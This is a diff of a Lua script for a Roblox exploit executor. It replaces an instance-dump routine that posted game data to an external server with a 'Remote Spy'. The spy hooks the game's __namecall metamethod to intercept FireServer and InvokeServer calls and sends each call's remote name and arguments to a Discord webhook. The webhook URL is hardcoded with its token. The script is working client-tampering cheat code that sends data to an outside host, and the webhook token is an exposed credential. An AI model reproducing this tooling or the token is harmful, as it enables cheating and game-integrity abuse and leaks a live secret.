@@ -1,92 +1,95 @@
 local HttpService = game:GetService("HttpService")
-local httpRequest = (syn and syn.request)
-    or (http and http.request)
-    or (fluxus and fluxus.request)
-    or request
-    or http_request
 
-if not httpRequest then
-    warn("❌ No supported HTTP request method found.")
-    return
-end
+local webhookURL = "https://discord.com/api/webhooks/1368740509186527323/M1FD3uiD0S7lYr_XP_h7flGHZfdi8b_gYgveK9p904iO1q380Dxd53nY7CucVdUzclpv"
 
--- Utility: Serialize instance properties
-local function serializeProperties(inst)
-    local props = {}
-    local properties = {
-        "Name", "ClassName", "Parent", "Archivable", "Anchored", "CanCollide", "Transparency",
-        "Position", "Size", "Rotation", "Velocity", "Color", "Material", "CFrame", "PrimaryPart", 
-        "Orientation", "Health", "WalkSpeed", "JumpHeight", "BrickColor"
-    }
-
-    for _, prop in ipairs(properties) do
-        local success, val = pcall(function() return inst[prop] end)
-        if success then
-            -- Serialize complex types like Color3, Vector3, and CFrame
-            if typeof(val) == "Color3" then
-                props[prop] = tostring(val)
-            elseif typeof(val) == "Vector3" then
-                props[prop] = tostring(val)
-            elseif typeof(val) == "CFrame" then
-                props[prop] = tostring(val)
-            elseif typeof(val) == "BrickColor" then
-                props[prop] = tostring(val)
-            else
-                props[prop] = val
-            end
+local function universalRequest(options)
+    local reqFuncs = {syn and syn.request, http_request, request}
+    for _, func in pairs(reqFuncs) do
+        if type(func) == "function" then
+            return func(options)
         end
     end
-    return props
+    warn("[Remote Spy] No supported request function found.")
 end
 
--- Utility: Serialize children
-local function serializeChildren(inst)
-    local children = {}
-    for _, child in ipairs(inst:GetChildren()) do
-        table.insert(children, {
-            Name = child.Name,
-            ClassName = child.ClassName,
-            _properties = serializeProperties(child)
-        })
-    end
-    return children
-end
+local sentCache = {}
 
--- Send the regular instances (e.g., Workspace, Players) to the server
-local function sendInitialInstanceData()
-    local initialInstances = {
-        "Workspace", "Players", "Lighting", "ReplicatedFirst",
-        "ReplicatedStorage", "StarterGui", "StarterPack", "StarterPlayer",
-        "SoundService", "Chat", "HttpService", "UserInputService", 
-        "TweenService", "GuiService", "CoreGui"
-    }
-    local updates = {}
-
-    for _, path in ipairs(initialInstances) do
-        local instance = game:FindFirstChild(path)
-        if instance then
-            updates[path] = serializeChildren(instance)
+local function serializeArgs(args)
+    local serialized = {}
+    for i, v in ipairs(args) do
+        local ok, result = pcall(function()
+            return HttpService:JSONEncode(v)
+        end)
+        if ok then
+            table.insert(serialized, result)
+        else
+            table.insert(serialized, "\"[unserializable datatype: " .. typeof(v) .. "]\"")
         end
     end
-
-    -- Log the data before sending to confirm it's structured correctly
-    local json = HttpService:JSONEncode(updates)
-    print("Sending the following data to the server:", json)  -- Logs the data being sent
-
-    -- Send initial instance data
-    local success, err = pcall(function()
-        httpRequest({
-            Url = "https://jn5t96-3000.csb.app/dex_children",
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = json
-        })
-    end)
-
-    if not success then
-        warn("❌ Failed to send request:", err)
-    end
+    return serialized
 end
 
--- Call the function to populate the initial data
-sendInitialInstanceData()
+-- Unique key generator for call deduplication
+local function generateKey(remote, method, args)
+    local data = {
+        remote = remote:GetFullName(),
+        method = method,
+        args = serializeArgs(args)
+    }
+    return HttpService:JSONEncode(data)
+end
+
+-- Send remote call info to Discord webhook
+local function sendToDiscord(remote, method, args)
+    local serializedArgs = serializeArgs(args)
+    local payload = {
+        username = "Remote Spy",
+        embeds = {{
+            title = "📡 Remote Call Detected",
+            color = 0x00bfff,
+            fields = {
+                {
+                    name = "🔁 Remote",
+                    value = "`" .. remote:GetFullName() .. "`",
+                    inline = false
+                },
+                {
+                    name = "📦 Method",
+                    value = "`" .. method .. "`",
+                    inline = true
+                },
+                {
+                    name = "📨 Arguments",
+                    value = "```lua\n" .. table.concat(serializedArgs, ",\n") .. "\n```",
+                    inline = false
+                }
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    universalRequest({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+local oldNamecall
+oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
+        local args = {...}
+        local key = generateKey(self, method, args)
+        if not sentCache[key] then
+            sentCache[key] = true
+            sendToDiscord(self, method, args)
+        end
+    end
+    return oldNamecall(self, ...)
+end))
+
+print("[✅ Universal Remote Spy Enabled]")
